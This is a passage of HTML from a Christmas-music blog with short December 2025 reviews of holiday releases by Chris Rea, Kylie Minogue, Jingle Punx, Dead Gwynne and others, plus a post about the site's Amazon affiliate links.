+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/christmastime-christmas-time-machine-chaz-kangas-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/christmastime-christmas-time-machine-chaz-kangas-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/3MQmcOb"><img alt="chazkangas.jpg" src="http://www.mistletunes.com/art/chazkangas.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>I've been remiss if I believe this Minneapolis guy's <a href="https://chazkangas.bandcamp.com/track/christmastime-christmas-time-machine" target="_blank">Bandcamp</a> blurb about how this 2025 tune is his 20th annual holiday single. Doesn't appear they're all on Bandcamp, but there's a bunch of them there. For now I'll just stick to this year's entry, a bit of white-guy hip-hop about how Christmas can transport you through time, a nice sci-fi way of describing nostalgia. Hop over and grab this, as his holiday releases are charitable outreaches benefitting <a href="https://rainn.org" target="_blank">RAINN</a> and <a href="https://www.wigsforkids.org" target="_blank">Wigs For Kids</a>. Streaming and downloads, click the cover to get it from Amazon.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/the-christmas-album-chris-rea-magnet.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2813"
+    dc:title="The Christmas Album, Chris Rea (Magnet)"
+    dc:identifier="http://www.mistletunes.com/2025/12/the-christmas-album-chris-rea-magnet.html"
+    dc:subject="Rock and Pop"
+    dc:description="It had only recently occurred to me that despite flagging numerous covers of this guy&apos;s popular Christmas song &quot;Driving Home For Christmas&quot; from 1986, we never gave it its own dedicated post. Two recent developments reminded me of this shortfall;..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-22T14:13:30-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2814" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/the-christmas-album-chris-rea-magnet.html" rel="bookmark">The Christmas Album, Chris Rea (Magnet)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-22T14:13:30-05:00">December 22, 2025  2:13 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/the-christmas-album-chris-rea-magnet.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/the-christmas-album-chris-rea-magnet.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4s6djAp"><img alt="chrisrea.jpg" src="http://www.mistletunes.com/art/chrisrea.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>It had only recently occurred to me that despite flagging numerous covers of this guy's popular Christmas song "Driving Home For Christmas" from 1986, we never gave it its own dedicated post. Two recent developments reminded me of this shortfall; one, the 2025 release of this compilation of holiday tunes by him, and two, his demise this week at age 74. "Driving" had actually dropped as the B-side of "Hello Friend" but, especially in his native UK and Europe, the record got flipped regularly at the end of the year for this nostalgic slice of yacht rock about holiday travels. This compilation is kind of slight, in that it includes two versions of "Driving" and "Footprints in the Snow," the latter one vocal and one instrumental; the slinky semi-spoken "Joys of Christmas"; the ballads"Smile" and "Winter Song"; and the instrumental reggae goof "Rudolph's Rotor Arm." Streaming and downloads everywhere, of course.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/season-of-joy-the-tell-alls-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2812"
+    dc:title="&quot;Season of Joy,&quot; The Tell Alls (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/season-of-joy-the-tell-alls-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="These guys are on a Christmas crusade. For 2025 they&apos;ve added to their holiday repertoire with this sweet indie-pop-sounding ballad. Doesn&apos;t show up on streaming yet, but you can download it free from their website...."
+    dc:creator="Rudolph"
+    dc:date="2025-12-22T13:48:49-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2813" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/season-of-joy-the-tell-alls-self-issued.html" rel="bookmark">"Season of Joy," The Tell Alls (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-22T13:48:49-05:00">December 22, 2025  1:48 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/season-of-joy-the-tell-alls-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/season-of-joy-the-tell-alls-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="tellallseasonofjoy.jpg" src="http://www.mistletunes.com/art/tellallseasonofjoy.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />These guys are on a Christmas crusade. For 2025 they've added to their holiday repertoire with this sweet indie-pop-sounding ballad. Doesn't show up on streaming yet, but you can download it free from their <a href="https://thetellalls.com" target="_blank">website</a>.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/now-thats-what-i-call-novelty-holiday-music-16-merkel-and-the-merkelettes-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2811"
+    dc:title="Now That&apos;s What I Call Novelty Holiday Music 16, Merkel and the Merkelettes (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/now-thats-what-i-call-novelty-holiday-music-16-merkel-and-the-merkelettes-self-issued.html"
+    dc:subject="Novelties"
+    dc:description="The Merkels have historically dropped their annual recording project exactly on Christmas Day in previous years, so I was surprised to see their 2025 release had dropped way back on Dec. 1. Anyway, it&apos;s here, an EP full of rock..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-22T13:45:51-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2812" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/now-thats-what-i-call-novelty-holiday-music-16-merkel-and-the-merkelettes-self-issued.html" rel="bookmark">Now That's What I Call Novelty Holiday Music 16, Merkel and the Merkelettes (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-22T13:45:51-05:00">December 22, 2025  1:45 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/now-thats-what-i-call-novelty-holiday-music-16-merkel-and-the-merkelettes-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/now-thats-what-i-call-novelty-holiday-music-16-merkel-and-the-merkelettes-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/44GKWP1"><img alt="merkel25.jpg" src="http://www.mistletunes.com/art/merkel25.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>The Merkels have historically dropped their annual recording project exactly on Christmas Day in previous years, so I was surprised to see their 2025 release had dropped way back on Dec. 1. Anyway, it's here, an EP full of rock parodies designed to change up the pace of your holiday playlists. If you missed last year's single of "Reindeer Game" (Chris Isaac parody) and "Last Christmas I Told You I Love You," not to worry, they're tacked onto the end of this release, at least on the streaming services. The remaining songs are "For Santa's Girth" (Buffalo Springfield), "One Red Light" (Wallflowers), "Tree" (Radiohead), and "Sittin on the Back of My Sleigh" (Otis Redding). As always, you might note the productions are a touch amateur, but that's part of their charm, I think. Available everywhere including <a href="https://themerkelettes.bandcamp.com/album/now-thats-what-i-call-novelty-holiday-music-16" target="_blank">Bandcamp</a>.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/a-playlist-and-a-word-from-our-sponsor.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2810"
+    dc:title="A playlist, and a word from our sponsor"
+    dc:identifier="http://www.mistletunes.com/2025/12/a-playlist-and-a-word-from-our-sponsor.html"
+    dc:subject="Housekeeping"
+    dc:description="Hi folks, I took a day to finish off the 2025 Mistletunes musical Christmas mix. I link to it here, but like all the previous ones it&apos;s down there in the sidebar too, at the top for alphabetical reasons. Regular..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-22T10:35:42-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2811" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/a-playlist-and-a-word-from-our-sponsor.html" rel="bookmark">A playlist, and a word from our sponsor</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-22T10:35:42-05:00">December 22, 2025 10:35 AM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/a-playlist-and-a-word-from-our-sponsor.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/a-playlist-and-a-word-from-our-sponsor.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p>Hi folks, I took a day to finish off the <a href="http://www.mistletunes.com/mix-discs/a-long-winters-nap-various-artists-mistletunes-2025.html" target="_blank">2025 Mistletunes musical Christmas mix</a>. I link to it here, but like all the previous ones it's down there in the sidebar too, at the top for alphabetical reasons. Regular posting will resume, so don't forget that our <a href="https://amzn.to/48sEpd2">Amazon</a> affiliation helps defray the costs of running this fine website, so consider using links from this site to jumpstart your shopping trips. Whenever there's an Amazon link to a particular song, it's accessed by clicking on the album cover art of the individual post. Join <a href="https://amzn.to/4pUJqko" target="_blank">Amazon Prime</a>, get audiobooks from <a href="https://amzn.to/3MnvTU6" target="_blank">Audible</a>, or stream <a href="https://amzn.to/3Mh5zeq" target="_blank">Amazon Music.</a> Thanks. </p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/fk-christmas-jingle-punx-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2808"
+    dc:title="&quot;F**K Christmas,&quot; Jingle Punx (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/fk-christmas-jingle-punx-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="The perennial Christmas punks are back in 2025 with a cover of Eric Idle&apos;s anti-Xmas carol. It was funny when it was just him and a guitar, and it&apos;s still funny with these guys thrashing it out all 1977-style for..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-20T14:32:22-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2809" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/fk-christmas-jingle-punx-self-issued.html" rel="bookmark">"F**K Christmas," Jingle Punx (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-20T14:32:22-05:00">December 20, 2025  2:32 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/fk-christmas-jingle-punx-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/fk-christmas-jingle-punx-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="punxfuckxmas.jpg" src="http://www.mistletunes.com/art/punxfuckxmas.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />The perennial Christmas punks are back in 2025 with a cover of Eric Idle's anti-Xmas carol. It was funny when it was just him and a guitar, and it's still funny with these guys thrashing it out all 1977-style for us. Appears to only be on their <a href="https://jinglepunx.bandcamp.com/track/f-k-christmas" target="_blank">Bandcamp</a> page.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/oh-no-its-christmas-chase-the-horseman-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2807"
+    dc:title="&quot;Oh No, It&apos;s Christmas,&quot; Chase the Horseman (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/oh-no-its-christmas-chase-the-horseman-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="Kansas City, MO-based Chase has been around for a while and for 2025 dreamed up this cool little pop-rocker with little bits of Phil Spector and Bruce Springsteen&apos;s sound mixed into a tune that also reminds of a more boisterous..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-20T14:11:47-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2808" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/oh-no-its-christmas-chase-the-horseman-self-issued.html" rel="bookmark">"Oh No, It's Christmas," Chase the Horseman (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-20T14:11:47-05:00">December 20, 2025  2:11 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/oh-no-its-christmas-chase-the-horseman-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/oh-no-its-christmas-chase-the-horseman-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4qeKKig"><img alt="chasehorse.jpg" src="http://www.mistletunes.com/art/chasehorse.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>Kansas City, MO-based Chase has been around for a while and for 2025 dreamed up this cool little pop-rocker with little bits of Phil Spector and Bruce Springsteen's sound mixed into a tune that also reminds of a more boisterous Father John Misty. Great stuff, and there are three different mixes of it included on the single. Downloads and streaming everywhere. </p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/kylie-christmas-fully-wrapped-kylie-minogue-parlophone.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2806"
+    dc:title="Kylie Christmas (Fully Wrapped), Kylie Minogue (Parlophone)"
+    dc:identifier="http://www.mistletunes.com/2025/12/kylie-christmas-fully-wrapped-kylie-minogue-parlophone.html"
+    dc:subject="Rock and Pop"
+    dc:description="Kylie&apos;s one of those British singing stars who, like Robbie Williams and The Darkness, have only managed the slightest visibility in the American music charts. This album originated in 2015 and has been retinseled for 2025 with three new tunes,..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-20T14:01:01-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2807" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/kylie-christmas-fully-wrapped-kylie-minogue-parlophone.html" rel="bookmark">Kylie Christmas (Fully Wrapped), Kylie Minogue (Parlophone)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-20T14:01:01-05:00">December 20, 2025  2:01 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/kylie-christmas-fully-wrapped-kylie-minogue-parlophone.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/kylie-christmas-fully-wrapped-kylie-minogue-parlophone.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/3MKYTFv"><img alt="kylieminogue.jpg" src="http://www.mistletunes.com/art/kylieminogue.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>Kylie's one of those British singing stars who, like Robbie Williams and The Darkness, have only managed the slightest visibility in the American music charts. This album originated in 2015 and has been retinseled for 2025 with three new tunes, the self-described "banger" "Hot In December," the uptempo "Office Party," and the ballad "This Time of Year." Kylie's usual sound is contemporary hit radio via early 90s dance music, but for the holiday crowd she willingly went old-school jazz-era pop on "It's the Most Wonderful Time of the Year," "Santa Baby," "Let It Snow," "Have Yourself a Merry Little Christmas," and "Santa Claus Is Coming to Town" in which she exhumes Frank Sinatra for a duet. (Of this latter item, from the original 2015 album, I'm really over this Duets of the Living Dead thing, especially since you can do something similar with AI nowadays.) The original album also featured modern originals like "100 Degrees" done with her sister Dannii, "White December," and "Christmas Isn't Christmas Till You Get Here." The modern stuff is clearly her forte and I'm happy to wave one or more of these into your playlists; the antique pop stuff is probably done better by others. Oh, almost forgot; if you buy the album from Amazon, it includes the 2015 tune "XMAS," which has remained exclusive to the merchant from that day to this. There are also endless remixes of this particular song available there as well.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/santa-makes-his-getaway-dead-gwynne-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2805"
+    dc:title="&quot;Santa Makes His Getaway,&quot; Dead Gwynne (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/santa-makes-his-getaway-dead-gwynne-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="It&apos;s the 30th anniversary of this DIY stalwart issuing their first Christmas song. For 2025 we get a rocked out number about a Santa Claus on the run. Cool stuff, free to download from their site (no streaming anywhere), and..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-20T12:49:43-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2806" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/santa-makes-his-getaway-dead-gwynne-self-issued.html" rel="bookmark">"Santa Makes His Getaway," Dead Gwynne (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-20T12:49:43-05:00">December 20, 2025 12:49 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/santa-makes-his-getaway-dead-gwynne-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/santa-makes-his-getaway-dead-gwynne-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="Dead Gwynne 2025.jpg" src="http://www.mistletunes.com/art/Dead%20Gwynne%202025.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />It's the 30th anniversary of this DIY stalwart issuing their first Christmas song. For 2025 we get a rocked out number about a Santa Claus on the run. Cool stuff, free to download <a href="https://www.sledbag.com/dg_holiday/index.html" target="_blank">from their site</a> (no streaming anywhere), and as always the whole 30 years worth of holiday music is there for your free download. Check it out.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+
+
+                            <div class="content-nav">
+                                <a href="http://www.mistletunes.com/archives.html">Archives</a>
+                            </div>
+
+
+                        </div>
+                    </div>
+
+
+                    <div id="beta">
+    <div id="beta-inner">
+
+
+    
+    <div class="widget-archive widget-archive-category widget">
+    <h3 class="widget-header">Categories</h3>
+    <div class="widget-content">
+    
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/blues/">Blues (37)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hanukkah/">Hanukkah (36)</a>
+        
+        
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/hanukkah/1990s-3/">1990s (4)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hanukkah/2000s-4/">2000s (13)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hanukkah/2010s-3/">2010s (10)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hanukkah/2020s/">2020s (6)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hanukkah/compilations-3/">Compilations (7)</a>
+        
+        
+            </li>
+        
+        </ul>
+        
+    
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/">Hip-Hop (89)</a>
+        
+        
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/1970s-1/">1970s (1)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/1980s-2/">1980s (2)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/1990s-2/">1990s (7)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/2000s-2/">2000s (20)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/2010s-5/">2010s (39)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/2020s-1/">2020s (20)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/hip-hop/compilations-2/">Compilations (17)</a>
+        
+        
+            </li>
+        
+        </ul>
+        
+    
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/housekeeping/">Housekeeping (71)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/latin/">Latin (8)</a>
+        
+        
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/latin/compilations-4/">Compilations (3)</a>
+        
+        
+            </li>
+        
+        </ul>
+        
+    
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/letters-to-mistletunes/">Letters to Mistletunes (8)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/non-christmas/">Non-Christmas (1)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/">Novelties (222)</a>
+        
+        
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/1950s-2/">1950s (8)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/1960s-3/">1960s (5)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/1970s-4/">1970s (7)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/1980s-1/">1980s (15)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/1990s-1/">1990s (29)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/2000s/">2000s (73)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/2010s-1/">2010s (59)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/2020s/">2020s (24)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/compilations-6/">Compilations (11)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/novelties/soundtracks-1/">Soundtracks (1)</a>
+        
+        
+            </li>
+        
+        </ul>
+        
+    
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/">Reggae (27)</a>
+        
+        
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/1960s-1/">1960s (2)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/1970s-2/">1970s (3)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/1980s-3/">1980s (3)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/1990s-4/">1990s (6)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/2000s-5/">2000s (2)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/2010s-4/">2010s (5)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/2020s/">2020s (7)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/reggae-1/compilations-5/">Compilations (7)</a>
+        
+        
+            </li>
+        
+        </ul>
+        
+    
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/">Rock and Pop (2149)</a>
+        
+        
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/1950s/">1950s (8)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/1960s/">1960s (30)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/1970s/">1970s (28)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/1980s/">1980s (46)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/1990s/">1990s (129)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/2000s-1/">2000s (535)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/2010s/">2010s (860)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/2020s/">2020s (520)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/compilations-1/">Compilations (353)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/metal/">Metal (28)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/punk/">Punk (106)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/rock-and-pop/soundtracks/">Soundtracks (14)</a>
+        
+        
+            </li>
+        
+    
+        
+        
